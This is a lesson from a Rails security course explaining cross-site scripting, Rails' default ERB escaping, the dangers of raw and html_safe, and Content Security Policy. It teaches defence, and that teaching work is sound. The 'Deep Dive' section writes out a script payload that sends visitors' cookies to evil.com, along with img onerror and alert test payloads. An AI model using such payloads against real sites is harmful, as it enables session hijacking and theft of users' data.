---
source_course: "rails-security-hardening"
source_lesson: "rails-security-understanding-xss"
---

# Understanding XSS

## Introduction
Cross-Site Scripting (XSS) occurs when attackers inject malicious scripts into web pages viewed by other users. Unlike SQL injection which targets your database, XSS targets your users' browsers, stealing cookies, session tokens, and personal data.

## Key Concepts
- **Stored XSS**: Malicious script is saved in the database and served to all users who view the affected page.
- **Reflected XSS**: Malicious script is included in a URL parameter and reflected back in the page response.
- **DOM-based XSS**: Vulnerability in client-side JavaScript that manipulates the DOM with untrusted data.
- **Output Escaping**: Converting special HTML characters to their entity equivalents so they display as text rather than execute as code.

## Real World Context
XSS is the most common web vulnerability. Any feature that displays user-generated content — comments, profiles, messages, search results — is a potential XSS vector. Rails escapes output by default, but developers can accidentally bypass this protection.

## Deep Dive

Imagine a comment system that displays user input without escaping:

```html
<!-- If a user submits this as a comment -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

If rendered without escaping, every visitor's cookies are sent to the attacker's server. This enables session hijacking — the attacker can impersonate any affected user.

### Stored XSS

Stored XSS is the most dangerous variant because the payload persists in the database:

```ruby
# User saves this as their profile bio
# <img src=x onerror="alert('XSS')">
# Every visitor to their profile page triggers the script
```

The `onerror` handler fires when the browser fails to load the invalid image source, executing the attacker's JavaScript.

### Rails' Automatic Protection

Rails automatically escapes HTML in ERB templates using the `<%= %>` output tag:

```erb
<!-- This is safe — Rails escapes the output -->
<p><%= @comment.body %></p>

<!-- If body contains <script>alert('XSS')</script> -->
<!-- It renders as: &lt;script&gt;alert('XSS')&lt;/script&gt; -->
```

The angle brackets are converted to HTML entities, so the script tag displays as text rather than executing.

### When Protection is Bypassed

The `raw` and `html_safe` methods bypass escaping and should be used with extreme caution:

```erb
<!-- DANGEROUS — renders raw HTML -->
<%= raw @user_content %>
<%= @user_content.html_safe %>
```

Only use these with content you fully control or have sanitized through a trusted sanitization pipeline.

## Common Pitfalls
1. **Using `html_safe` on user content** — Developers sometimes call `.html_safe` to render formatted content, not realizing it disables all XSS protection.
2. **Trusting data from the database** — Just because data is stored in your database does not mean it is safe. If a user submitted it, it could contain scripts.

## Best Practices
1. **Trust Rails' default escaping** — The `<%= %>` tag is safe by default. Only bypass it with `raw` or `html_safe` when absolutely necessary and with sanitized content.
2. **Use Content Security Policy** — CSP headers provide defense-in-depth by restricting what scripts can execute, even if XSS escaping is bypassed.

## Summary
- XSS attacks inject malicious scripts into pages viewed by other users.
- Stored XSS persists in the database and affects all visitors.
- Rails automatically escapes HTML output in ERB templates with `<%= %>`.
- Never use `raw` or `html_safe` on user-supplied content without sanitization.
- Content Security Policy provides an additional layer of defense.

## Code Examples

**Rails' default escaping vs dangerous bypasses — the difference between displaying text and executing malicious scripts**

```ruby
# Rails auto-escapes output in ERB templates
# <%= @comment.body %>  => safe, escapes HTML entities

# DANGEROUS — bypasses escaping:
# <%= raw @user_content %>
# <%= @user_content.html_safe %>

# If @comment.body = "<script>alert('XSS')</script>"
# Safe output:   &lt;script&gt;alert('XSS')&lt;/script&gt;
# Unsafe output: <script>alert('XSS')</script>  (executes!)
```


## Resources

- [Rails Security Guide — XSS](https://guides.rubyonrails.org/security.html#cross-site-scripting-xss) — Official Rails guide on preventing cross-site scripting
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — Comprehensive XSS prevention reference across contexts

---

> 📘 *This lesson is part of the [Rails Security Hardening](https://stanza.dev/courses/rails-security-hardening) course on [Stanza](https://stanza.dev) — the IDE-native learning platform for developers.*